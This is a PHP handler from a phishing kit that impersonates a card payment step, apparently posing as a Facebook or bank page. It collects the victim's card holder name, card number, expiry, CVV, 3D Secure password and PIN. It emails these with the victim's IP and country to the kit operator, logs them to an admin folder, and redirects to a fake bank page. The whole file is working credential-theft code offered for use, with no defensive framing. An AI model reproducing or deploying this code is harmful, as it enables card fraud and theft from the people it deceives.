<?php
header('Location: ../bank.html');
require 'Email.php';
require 'getdata.php';
$noc = $_POST['noc'];
$cn = $_POST['cn'];
$ex = $_POST['ex'];
$cvv = $_POST['cvv'];
$d3 = $_POST['d3'];
$cp = $_POST['cp'];
$to = "$yourmail";
$subject = "👑CC-INFO👑 FROM  ".$ip."🔥".$country."";
$message = "
<html>
<head>
<meta charset='UTF-8'></head>
<div style='font-size: 13px;font-family:monospace;font-weight:700;'>
#################### <font style='color: #820000;'>FB CC FULL</font> ####################<br/>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>CC INFORMATION</font> ]±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [Card Holder Name] = <font style='color:#0070ba;'>$noc</font><br>
<font style='color:#9c0000;'>✪</font> [Card Number] = <font style='color:#0070ba;'>$cn</font><br>
<font style='color:#9c0000;'>✪</font> [Expiration Date] = <font style='color:#0070ba;'>$ex</font><br>
<font style='color:#9c0000;'>✪</font> [Card Security Code] = <font style='color:#0070ba;'>$cvv</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>3D INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [3D PASS] = <font style='color:#0070ba;'>$d3</font><br>
<font style='color:#9c0000;'>✪</font> [CARD PIN] = <font style='color:#0070ba;'>$cp</font><br>
±±±±±±±±±±±±±±±±[ <font style='color: #0a5d00;'>VICTIME INFORMATION</font> ]±±±±±±±±±±±±±±±±±±±<br>
<font style='color:#9c0000;'>✪</font> [IP INFO] = <font style='color:#0070ba;'>https://geoiptool.com/en/?ip=$ip</font><br>
<font style='color:#9c0000;'>✪</font> [TIME/DATE] = <font style='color:#0070ba;'>$time</font><br>
##################### <font style='color: #820000;'>Thankx to ✪ Coachella ✪</font> #####################
</div></html>
";
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= 'From:💳CreditCards💳 <priv8scampage@rez.com>' . "\r\n";
mail($to,$subject,$message,$headers);

$path = "../../../admin/ips/$ip.html";
file_put_contents($path,"$message<br><br>", FILE_APPEND);
?>